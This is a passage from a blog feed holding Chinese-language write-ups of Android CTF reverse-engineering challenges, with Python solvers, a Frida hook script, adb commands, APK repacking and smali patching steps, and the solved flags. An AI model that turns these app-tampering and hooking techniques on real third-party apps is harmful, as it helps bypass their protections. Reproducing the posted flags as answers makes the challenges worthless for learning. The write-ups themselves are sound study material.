alt="image-20210208173332255"></p><p>开始从字符串fish以为是blowfish加密，但简单看了下流程，完全对不上。</p><blockquote><p><strong>blowfish是加密64bit为数据，密钥也是64bit位。把密文分为每8个字节一组，然后一组分成2个部分，进行轮函数加密。</strong></p></blockquote><p>但这里是每16个字节一组，且加密流程也不一样：</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210208175231246.png" alt="image-20210208175231246"></p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210208175306552.png" alt="image-20210208175306552"></p><p>最后，翻了一下这个加密中的数据用来搜索下找找相关的加密算法。</p><p>从最顶部的数据，google结果：<a href="https://xz.aliyun.com/t/5807" target="_blank" rel="noopener">TwoFish</a></p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210208175435115.png" alt="image-20210208175435115"></p><p>然后使用python解密一下：因为33位，不是16的倍数，用0补齐成了48位。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> twofish <span class="keyword">import</span> Twofish</span><br><span class="line"></span><br><span class="line">enc = [<span class="number">-120</span>, <span class="number">77</span>, <span class="number">-14</span>, <span class="number">-38</span>, <span class="number">17</span>, <span class="number">5</span>, <span class="number">-42</span>, <span class="number">44</span>, <span class="number">0xE0</span>, <span class="number">109</span>, <span class="number">85</span>, <span class="number">0x1F</span>, <span class="number">24</span>, <span class="number">-91</span>, <span class="number">0x90</span>, <span class="number">-83</span>, <span class="number">0x40</span>, <span class="number">-83</span>, <span class="number">0x80</span>, <span class="number">84</span>, <span class="number">5</span>, <span class="number">-94</span>, <span class="number">-98</span>, <span class="number">-30</span>, <span class="number">18</span>, <span class="number">70</span>, <span class="number">-26</span>, <span class="number">71</span>, <span class="number">5</span>, <span class="number">-99</span>, <span class="number">-62</span>, <span class="number">-58</span>, <span class="number">0x75</span>, <span class="number">29</span>, <span class="number">-44</span>, <span class="number">6</span>, <span class="number">0x70</span>, <span class="number">-4</span>, <span class="number">81</span>, <span class="number">84</span>, <span class="number">9</span>, <span class="number">22</span>, <span class="number">-51</span>, <span class="number">0x5F</span>, <span class="number">-34</span>, <span class="number">12</span>, <span class="number">0x2F</span>, <span class="number">77</span>]</span><br><span class="line">enc = [i&amp;<span class="number">0xff</span> <span class="keyword">for</span> i <span class="keyword">in</span> enc]</span><br><span class="line">enc = bytes(enc)</span><br><span class="line"></span><br><span class="line">key = <span class="string">'I have a male fish and a female '</span>.encode() <span class="comment">#bytes类型</span></span><br><span class="line"></span><br><span class="line">T = Twofish(key)</span><br><span class="line">flag = <span class="string">b''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(enc)//<span class="number">16</span>):</span><br><span class="line">    flag += T.decrypt(enc[<span class="number">16</span>*i:<span class="number">16</span>*(i+<span class="number">1</span>)])</span><br><span class="line">print(flag)</span><br><span class="line"><span class="comment">#qwb&#123;TH3y_Io&lt;e_EACh_OTh3r_FOrEUER&#125;</span></span><br></pre></td></tr></table></figure><p>最后是做完题看了别人wp学习，发现：</p><ul><li>那个uncompress操作其实可以直接使用python的zlib模块，<strong>zlib.decompress(data)</strong> 就可以了。</li><li>可以把dex合成新的apk文件运行，接下来操作一下。</li></ul><p>dex合成新的apk文件：</p><p>1.把之前的app解包。</p><p>2.把<strong>AndroidManifest.xml</strong>中的android:hasCode=”false”属性去掉，默认为True。原因：之前的app是用c++开发的，app中并不包含java代码，所以把这个属性设置为False。</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210208185306706.png" alt="image-20210208185306706"></p><p>3.把<strong>AndroidManifest.xml</strong>中activity的android:name改为当前包和MainActivity。</p><p>4.把之前得到的dex文件改名为classes.dex放到解包目录下。</p><p>5.重新打包，并签名。</p><p>成功：</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210208190250967.png" alt="image-20210208190250967"></p><h3 id="你是谁"><a href="#你是谁" class="headerlink" title="你是谁"></a>你是谁</h3><p>意义不大的一道题。</p><p>找到触摸响应的地方，可以看到<strong>sorted flag</strong>相关字符串，然后上面的getsna方法是得到汉字字符的unicode编码进行一个从小到大的选择排序，最后比较。</p><p>这里从排序结果后的汉字编码结果可以推出未经过排序后的值。</p><p>最后按照从字符串的提示，把汉字结果再转回unicode编码再套上flag{}即是。</p><h3 id="基础android"><a href="#基础android" class="headerlink" title="基础android"></a>基础android</h3><p>看了下程序逻辑，解出第一个密码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s = [<span class="number">107</span>-i <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">12</span>)]</span><br></pre></td></tr></table></figure><p>然后进入MainActivity2把第二次的输入作为参数发送了一个广播：</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210220151141668.png" alt="image-20210220151141668"></p><p>继续跟到接受广播的地方，看到又开始了一个新的活动。</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210220151639862.png" alt="image-20210220151639862"></p><p>但看了后面的NextContent也没有验证图片显示码的地方，但是读了下代码，功能就是取出app中的资源文件中的timg_2.zip作为图片替换原来的图片。直接在jeb的Assets找到该文件，打开即是。</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210220151914447.png" alt="image-20210220151914447"></p><p>其实，既然是NextContent活动直接更新了有flag的图片，直接adb启动指定的活动，也可以得到。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell am start -n com.example.test.ctf02/.NextContent</span><br></pre></td></tr></table></figure><p>最后学习知道了<strong>那个图片显示码其实触发广播需要的密码</strong>，在清单文件有。</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210220152303564.png" alt="image-20210220152303564"></p><p>且<strong>android:exported=”true”</strong>属性代表可以进行外部调用，那我们还可以用adb构造一个广播来达到目的。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell am broadcast -a android.is.very.fun</span><br></pre></td></tr></table></figure><h3 id="APK逆向"><a href="#APK逆向" class="headerlink" title="APK逆向"></a>APK逆向</h3><p>把Tenshine进行md5().hexdigest()加密后取出偶数位。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">s = md5(<span class="string">b'Tenshine'</span>).hexdigest()</span><br><span class="line">flag = [s[i] <span class="keyword">for</span> i <span class="keyword">in</span> range(len(s)) <span class="keyword">if</span> i%<span class="number">2</span> == <span class="number">0</span>]</span><br><span class="line">print(<span class="string">''</span>.join(flag))</span><br></pre></td></tr></table></figure><p>题目很简单，但是从搭环境开始通过这个题学了一下frida hook java层。</p><p>简单记录一下流程：</p><blockquote><ol><li>安卓端执行下载好的对应frida服务。</li><li>进行2次端口转发：<strong><code>adb forward tcp:27043 tcp:27043</code>和<code>adb forward tcp:27042 tcp:27042</code></strong></li><li>安卓端运行app</li><li>执行写好的hook脚本。</li></ol></blockquote><p>贴下hook代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> frida</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">jscode = <span class="string">'''</span></span><br><span class="line"><span class="string">    Java.perform(function()&#123;</span></span><br><span class="line"><span class="string">        var MainActivity = Java.use('com.example.crackme.MainActivity');</span></span><br><span class="line"><span class="string">        MainActivity.toHexString.implementation = function(a, b)&#123;</span></span><br><span class="line"><span class="string">            var ans = this.toHexString(a, b);</span></span><br><span class="line"><span class="string">            send(ans);</span></span><br><span class="line"><span class="string">            return ans;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;);</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">   </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">on_message</span><span class="params">(message, data)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> message[<span class="string">'type'</span>] == <span class="string">'send'</span>:</span><br><span class="line">        print(message[<span class="string">'payload'</span>][::<span class="number">2</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(message)</span><br><span class="line"></span><br><span class="line">process = frida.get_remote_device().attach(<span class="string">'com.example.crackme'</span>)</span><br><span class="line">script = process.create_script(jscode)</span><br><span class="line">script.on(<span class="string">'message'</span>, on_message)</span><br><span class="line">script.load()</span><br></pre></td></tr></table></figure><h3 id="人民的名义-抓捕赵德汉1-200"><a href="#人民的名义-抓捕赵德汉1-200" class="headerlink" title="人民的名义-抓捕赵德汉1-200"></a>人民的名义-抓捕赵德汉1-200</h3><p>一个jar包，用jd-gui看一下java代码。一个md5加密，在线解一下即可。</p><p>这里了解一下什么时候jar包：<strong>jar包是eclipse下的压缩包，由多个class文件压缩而成的。</strong></p><h3 id="boomshakalaka-3"><a href="#boomshakalaka-3" class="headerlink" title="boomshakalaka-3"></a>boomshakalaka-3</h3><p>飞机大战游戏。</p><p>jeb反编译后找到入口类：多次调用了a类中的d方法。</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210224192959108.png" alt="image-20210224192959108"></p><p>看看a类d方法功能：其中getSharedPreferences()是关键，返回一个SharedPreference对象，它会在/data/data/com.example.plane/下生成一个xml文件，以键值对的形式存储向其中输入的数据。</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210224193105424.png" alt="image-20210224193105424"></p><p>adb看一下：</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210224195210759.png" alt="image-20210224195210759"></p><p>但程序提示的打到最高分，java层没有任何与分数相关的地方，进入so中找到分数的地方：分析下且从DATA可以知道，这里就是根据我们打的分数不断向xml文件中添加写入不同的字符串。<img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210224195529004.png" alt="image-20210224195529004"></p><p>而要写入字符串字符串的开始和结尾是确定了的，只是中间的字符串会因为分数不同而不通过，这个自己打游戏然后查看数据或者直接ida中分析都可以知道。</p><p>注意的地方：要指定的分数才会写入指定字符串，所以如果打游戏测试的话要算着打😂。</p><p>测试一波后，写入顺序就是给出的，把开始结尾确定好后向中间填充好base64解码得到flag。</p><p><strong>MGN0ZntDMGNvUzJkX0FuRHJvMWRfRzBtRV9Zb1VfS24wdz99</strong></p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210224202624546.png" alt="image-20210224202624546"></p><h3 id="android1"><a href="#android1" class="headerlink" title="android1"></a>android1</h3><p>app进行了梆梆加固，开始准备环境安装dump dex，准备完开始安装app发现报错。</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210225225117463.png" alt="image-20210225225117463"></p><p>后面才发现了是因为app没有签名，签上名后还要注意：</p><p>安装时带上-t选项。原因：</p><p>Android Studio 3.0会在debug apk的<code>manifest</code>文件<code>application</code>标签里自动添加 <code>android:testOnly=&quot;true&quot;</code>属性。</p><p>成功安装程序，打开提示资源文件，进而从values的string.xml中找到flag。</p><p><strong>flag{1FF9B2CCB90A2D943DBAA072DF0A279C}</strong></p><h3 id="Android2-0"><a href="#Android2-0" class="headerlink" title="Android2.0"></a>Android2.0</h3><p>简单考了一下so层。</p><p><strong>flag{sosorryla}</strong></p><h3 id="Illusion"><a href="#Illusion" class="headerlink" title="Illusion"></a>Illusion</h3><p>关键就在so层的一个加密函数，开始直接在Exports找到名称为CheckFlag的函数，为了熟悉一下so层的调试，在这个函数下了断点但每次都不断不下来。。</p><p>然后开始找原因，后面发现这个假的函数，真正是动态加载的。</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210303203021780.png" alt="image-20210303203021780"></p><p>进入正确的函数开始分析，函数的伪代码明显是有点问题的，看arm汇编就好了。</p><p>其中关键就是<strong>sub_CCB09028</strong>这个函数：</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210303203358493.png" alt="image-20210303203358493"></p><p>分析了一下没看出所以然，但这个是一位一位加密的，所以可以直接穷举的。</p><p>写ida-python，但这个穷举最后一位有2个字符都可，空格和‘}’，还好是最后一位，那肯定是字符}了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">enc = <span class="string">"Ku@'G_V9v(yGS"</span></span><br><span class="line">s = <span class="string">'(Ljava/lang/String;Ljava/'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun</span><span class="params">(a1, a2)</span>:</span></span><br><span class="line">    v3 = <span class="number">1</span></span><br><span class="line">    v4 = <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> a1 &gt;= a2:  </span><br><span class="line">        <span class="keyword">while</span> a2 &lt; a1:</span><br><span class="line">            a2 *= <span class="number">16</span></span><br><span class="line">            v3 *= <span class="number">16</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">if</span> a1 &gt;= a2:</span><br><span class="line">                a1 -= a2</span><br><span class="line">                v4 |= v3</span><br><span class="line">            <span class="keyword">if</span> a1 &gt;= a2 &gt;&gt; <span class="number">1</span>:</span><br><span class="line">                a1 -= a2 &gt;&gt; <span class="number">1</span></span><br><span class="line">                v4 |= v3 &gt;&gt; <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> a1 &gt;= a2 &gt;&gt; <span class="number">2</span>:</span><br><span class="line">                a1 -= a2 &gt;&gt; <span class="number">2</span></span><br><span class="line">                v4 |= v3 &gt;&gt; <span class="number">2</span></span><br><span class="line">            <span class="keyword">if</span> a1 &gt;= a2 &gt;&gt; <span class="number">3</span>:</span><br><span class="line">                a1 -= a2 &gt;&gt; <span class="number">3</span></span><br><span class="line">                v4 |= v3 &gt;&gt; <span class="number">3</span></span><br><span class="line">            <span class="keyword">if</span> a1 == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            v3 &gt;&gt;= <span class="number">4</span></span><br><span class="line">            <span class="keyword">if</span> v3 == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            a2 &gt;&gt;= <span class="number">4</span>      </span><br><span class="line">    <span class="keyword">return</span> v4</span><br><span class="line">    </span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(enc)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">33</span>, <span class="number">127</span>):</span><br><span class="line">        r1 = j+ord(s[i])<span class="number">-64</span></span><br><span class="line">        r2 = <span class="number">0x5d</span></span><br><span class="line">        <span class="keyword">if</span> r1 - fun(r1, r2)*<span class="number">0x5d</span> + <span class="number">0x20</span> == ord(enc[i]):</span><br><span class="line">            flag += chr(j)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(flag.encode())</span><br><span class="line"><span class="comment">#CISCN&#123;GJ5728&#125;</span></span><br></pre></td></tr></table></figure><p>写完仔细分析了下那个函数，其实该函数和后面对函数返回值的处理就是<strong>求模（mod）</strong>的操作，但没有使用/与mod，可以学习一下。这从最后的操作看其实很明显。</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210303204003498.png" alt="image-20210303204003498"></p><h3 id="APK逆向-2"><a href="#APK逆向-2" class="headerlink" title="APK逆向-2"></a>APK逆向-2</h3><p>首先安装app失败。。</p><p>反编译后首先看了一下<strong>AndroidManifest.xml</strong>，发现空的。。然后看了app的主要逻辑和类，很乱和杂吧，也不清楚要做什么。。</p><p>然后我为了看其中的一个资源文件对app进行了直接解压，这个倒是没看出什么。</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210304192508917.png" alt="image-20210304192508917"></p><p>但在其中看到<strong>AndroidManifest.xml</strong>并不是空的，然后尝试使用apktool对apk解包，解包失败。</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210304192711623.png" alt="image-20210304192711623"></p><p>由此可以知道，应该是对<strong>AndroidManifest.xml</strong>文件做了手脚。</p><p>然后就是要知道安卓<strong>AndroidManifest.xml</strong>文件格式了，这是修改过的。</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210304193133042.png" alt="image-20210304193133042"></p><p>再看一个正常的：</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210304193230661.png" alt="image-20210304193230661"></p><p>通过修复后，重新压缩成压缩包，在xml文件中看到flag相关：</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/H1aGYAcMoEPShpW.png" alt="image-20210304193456601"></p><h3 id="ill-intentions"><a href="#ill-intentions" class="headerlink" title="ill-intentions"></a>ill-intentions</h3><p>在MainActivity中注册了一个广播接收器：</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210305193418021.png" alt="image-20210305193418021"></p><p>根据在设置在屏幕上的文本来看Send_to_Activity，就是根据接受到的不同广播消息执行不同的函数。</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210305193507242.png" alt="image-20210305193507242"></p><p>然后看了一下三个不同的函数，其执行逻辑其实是一样的，把3个指定字符串经过sha224与base64及替换加密后再经过so层函数的操作，最后把结果以广播形式发出，但这里并不是发送给Send_to_Activity。</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210305213542600.png" alt="image-20210305213542600"></p><p>so层的加密操作一个异或，能想到运算结果就是我们要的flag。</p><p>由于只有三种结果，用ida-python模拟了程序的运算逻辑，在IsThisTheRealOne活动得到flag。这里开始一直出错得不到结果，后面调试发现是getClass().getName()得到的类名我没有把整个包加上。。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha224</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">a = [<span class="string">'e'</span>, <span class="string">'W'</span>, <span class="string">'h'</span>, <span class="string">'a'</span>, <span class="string">'t'</span>, <span class="string">'i'</span>, <span class="string">'s'</span>, <span class="string">'d'</span>, <span class="string">'o'</span>, <span class="string">'n'</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">en</span><span class="params">(s)</span>:</span></span><br><span class="line">    s = sha224(s.encode()).hexdigest().encode()</span><br><span class="line">    s = base64.b64encode(s).decode().replace(<span class="string">'='</span>, <span class="string">'?'</span>)</span><br><span class="line">    s = list(s)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(s)):</span><br><span class="line">        temp = ord(s[i])</span><br><span class="line">        <span class="keyword">if</span>  temp &gt; <span class="number">47</span> <span class="keyword">and</span> temp &lt; <span class="number">58</span>:</span><br><span class="line">            s[i] = a[temp<span class="number">-48</span>]</span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join(s)</span><br><span class="line">    </span><br><span class="line">s1 = <span class="string">b'TRytfrgooq|F&#123;i-JovFBungFk'</span>+<span class="string">b'\\VlphgQbwvj~HuDgaeTzuSt.@Lex^~'</span></span><br><span class="line">s1 = list(s1) + [<span class="number">119</span>, <span class="number">110</span>, <span class="number">119</span>, <span class="number">71</span>, <span class="number">114</span>, <span class="number">97</span>, <span class="number">98</span>, <span class="number">123</span>, <span class="number">79</span>, <span class="number">117</span>, </span><br><span class="line">  <span class="number">116</span>, <span class="number">98</span>, <span class="number">104</span>, <span class="number">127</span>, <span class="number">114</span>, <span class="number">67</span>] + list(<span class="string">b'tfqm&#125;'</span>)</span><br><span class="line">s2 = <span class="string">'SendAnIntentApplication'</span></span><br><span class="line">s3 = <span class="string">'com.example.application.IsThisTheRealOne$1'</span></span><br><span class="line">s3 = s3[<span class="number">0</span>:len(s3)<span class="number">-2</span>]</span><br><span class="line"></span><br><span class="line">s2 = en(s2).encode()</span><br><span class="line">s3 = en(s3).encode()</span><br><span class="line">print(<span class="string">'---------------------------------------------------'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">76</span>):</span><br><span class="line">    print(chr(s1[i]^s2[i]^s3[i]), end = <span class="string">''</span>)</span><br><span class="line"><span class="comment">#Congratulation!YouFoundTheRightActivityHereYouGo-CTF&#123;IDontHaveABadjokeSorry&#125;</span></span><br></pre></td></tr></table></figure><p>另外，由于app中是多个活动，开始我是想直接用adb命令来启动每个活动，通过调试看输出是什么，但都启动失败，什么权限禁止。通过计算得到flag后，通过搜集发现是要对活动没有指定属性<strong>android:exported=”true”</strong>，</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210305222644097.png" alt="image-20210305222644097"></p><blockquote><p><strong>android.intent.action.MAIN：决定应用的入口Activity，也就是我们启动应用时首先显示哪一个Activity。</strong><br><strong>android.intent.category.LAUNCHER：表示activity应该被列入系统的启动器(launcher)(允许用户启动它)。Launcher是安卓系统中的桌面启动器，是桌面UI的统称。</strong></p></blockquote><p>指定后通过adb命令启动成功，可直接通过调试查看生成的字符串，我尝试修改smali来插入打印Log的语句，然后同伙查看日志同样得到flag。</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210305223009728.png" alt="image-20210305223009728"></p><p>最后查看日志：<br><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210305223046697.png" alt="image-20210305223046697"></p><h2 id="d3ctf"><a href="#d3ctf" class="headerlink" title="d3ctf"></a>d3ctf</h2><h3 id="No-Name"><a href="#No-Name" class="headerlink" title="No Name"></a>No Name</h3><p>找到入口活动，将输入传入FlagChecker类的checkFlag函数，然后又是实现接口中的check函数，最后调用，感觉有点套娃，，实质就是调用native层的check函数。。</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210310201450601.png" alt="image-20210310201450601"></p><p>但是注意清单文件中application中的android:name属性：这里指定了<strong>app启动时关联的一个application，这个类的作用就是做一些初始化，放一些全局变量和程序上下文相关的东西</strong>，默认是android.app.Application。</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210310203122424.png" alt="image-20210310203122424"></p><p>来到app启动时指定的这个类：NoNameApp。比较简单的代码，就是得到资源文件data.enc然后获取一个aeskey对其进行aes解密，且这里指定的解密得到的文件和存放路径。然后进行dex加载并把FlagChecker中mFlagChecker的实例进行了替换，也就是把上面我们分析出的native层那个check函数进行了替换。</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210310203554497.png" alt="image-20210310203554497"></p><p>所以可以知道app真正检查的逻辑在解密出的jar文件中，现在的目的就是得到这个jar，首先想到的就是直接在程序运行后在指定的路径下去找。</p><p>虽然app在加载完解密后对解密出的文件进行了删除，但是可以将app的smali修改，删除<strong>file.delete()；</strong>后对其重新打包然后签名。</p><p>这里签名完后安装遇到了问题，一个是之前知道的app有<strong>android:testOnly=”true”</strong>，解决办法：1.安装时加上-t选项。2.在清单文件中删除该属性。</p><p>第二个问题：</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210310204857678.png" alt="image-20210310204857678"></p><p>搜索到这篇文章 <a href="https://testerhome.com/topics/18463" target="_blank" rel="noopener">https://testerhome.com/topics/18463</a></p><blockquote><p>如果 AndroidManifest.xml 中未设置 extractNativeLibs=true，使用 apktool 反编译时有可能导致 extractNativeLibs 被设置为 false。</p></blockquote><p>至于extractNativeLibs属性，开启的话就是把apk中的so解压缩提取到本地存取一份，关闭的话不在本地存储一份，在运行时直接调用app中的so。</p><p>如果关闭的话，且我们apk是未对齐或so文件是压缩状态的话将阻止我们安装apk，也就是上面的报的错。</p><p><strong>然后导致我们默认开启extractNativeLibs的属性关闭的原因：使用apktool对app进行反编译和回编译。</strong></p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210310205935229.png" alt="image-20210310205935229"></p><p>最后把这个属性改为true，回编译签名后，运行app，在data/data/包名/下得到解密出的jar文件，简单的异或。。</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210310210138830.png" alt="image-20210310210138830"></p><p>最后说一下，在AK中反编译apk遇到<strong>com.googlecode.d2j.DexException: not support version</strong>的问题。</p><p>这个是dex2jar版本与dex版本不兼容主动抛出的异常，从报错找到dex-reader-2.1-20190905-lanchon.jar文件中的DexFileReader函数，看源码。</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210310210853842.png" alt="image-20210310210853842"></p><p>解决办法，更换最新的dex2jar版本就好了。<a href="https://www.jianshu.com/p/55bf5f688e9a" target="_blank" rel="noopener">https://www.jianshu.com/p/55bf5f688e9a</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;从各处Android题来学习。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Andriod" scheme="https://www.Bxnop.cn/categories/Andriod/"/>
    
    
  </entry>
  
  <entry>
    <title>HGAME 2021</title>
    <link href="https://www.bxnop.cn/2021/02/04/HGAME%202021/"/>
    <id>https://www.bxnop.cn/2021/02/04/HGAME%202021/</id>
    <published>2021-02-04T10:04:15.000Z</published>
    <updated>2021-03-22T05:23:28.907Z</updated>
    
